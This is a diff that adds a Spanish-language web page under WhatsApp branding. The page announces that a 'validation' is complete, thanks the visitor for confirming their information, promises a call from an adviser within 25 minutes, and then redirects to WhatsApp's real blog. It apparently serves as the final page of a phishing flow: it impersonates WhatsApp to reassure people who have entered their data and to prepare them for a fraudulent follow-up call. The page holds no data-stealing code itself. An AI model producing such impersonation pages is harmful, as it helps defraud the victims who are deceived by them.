@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Validación completada</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Roboto', sans-serif;
+      background: linear-gradient(120deg, #e0ffe8 0%, #b8e1fc 100%);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: #075e54;
+    }
+    .container {
+      text-align: center;
+      max-width: 400px;
+      width: 90%;
+      background: white;
+      padding: 40px 30px;
+      border-radius: 16px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.1);
+    }
+    .logo {
+      margin-bottom: 20px;
+    }
+    .logo img {
+      width: 64px;
+      height: 64px;
+    }
+    h1 {
+      font-size: 22px;
+      margin-bottom: 12px;
+    }
+    p {
+      font-size: 16px;
+      margin-bottom: 20px;
+      color: #128c7e;
+    }
+    .warning {
+      font-size: 14px;
+      color: #d32f2f;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
+    </div>
+    <h1>✅ Validación completada</h1>
+    <p>Gracias por confirmar tu información.</p>
+    <p class="warning">⚠️ Un asesor se estará comunicando contigo en un plazo de 25 minutos para confirmar tu validación.</p>
+  </div>
+
+  <script>
+    setTimeout(() => {
+      window.location.href = 'https://blog.whatsapp.com/';
+    }, 5000); // 5 segundos
+  </script>
+</body>
+</html>
